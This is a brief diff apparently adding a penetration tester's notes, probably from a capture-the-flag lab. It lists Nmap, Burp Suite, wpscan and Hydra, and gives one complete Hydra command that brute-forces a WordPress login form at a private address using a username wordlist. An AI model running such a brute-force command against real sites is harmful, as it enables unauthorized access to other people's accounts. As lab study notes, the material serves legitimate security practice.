@@ -1,1 +1,8 @@
+Nmap
 
+burpsuite
+
+wpscan
+
+Hydra:
+hydra -V -L fsocity.dic -p 123 10.0.0.48 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"
